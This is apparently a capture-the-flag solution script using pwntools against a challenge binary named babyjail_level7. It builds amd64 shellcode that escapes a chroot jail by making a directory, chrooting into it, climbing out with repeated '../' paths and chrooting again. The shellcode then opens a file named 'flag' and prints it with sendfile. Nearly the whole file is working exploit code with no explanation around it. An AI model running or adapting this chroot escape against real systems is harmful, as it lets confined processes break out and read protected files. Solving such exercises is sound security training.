'''
openat
'''

from pwn import *
context.arch = "amd64"


my_sc = asm('''
    push 0x41
    mov rdi, rsp
    push SYS_mkdir
    pop rax
    syscall #mkdir("a")

    mov rdi, rsp
    push SYS_chroot
    pop rax
    syscall #chroot("a")

    push 0x2f
    mov rbx, 0x2e2e2f2e2e2f2e2e
    push rbx
    mov rdi, rsp
    push SYS_chdir
    pop rax
    syscall 

    push 0x2e
    mov rdi, rsp
    push SYS_chroot
    pop rax
    syscall 

    push 0x67616c66
    mov rdi, rsp
    mov rax, SYS_open
    mov rsi, 0 
    syscall

    /* call sendfile(1, 'rax', 0, 0x7fffffff) */
    mov r10d, 0x7fffffff
    mov rsi, rax
    push SYS_sendfile /* 0x28 */
    pop rax
    push 1
    pop rdi
    cdq /* rdx=0 */
    syscall

''')
# display the bytes
print(disasm(my_sc))
# fd = open("ttt-raw","wb+")
# fd.write(my_sc)
# fd.close()
p = process(["/challenge/babyjail_level7", "/"])
# context.terminal = ['tmux', 'splitw', '-h']  # Attempting to use multixterm
# p = gdb.debug(["/challenge/babyjail_level3", "/"], gdbscript="source /opt/gef/gef.py")
p.send(my_sc)
all = p.recvall()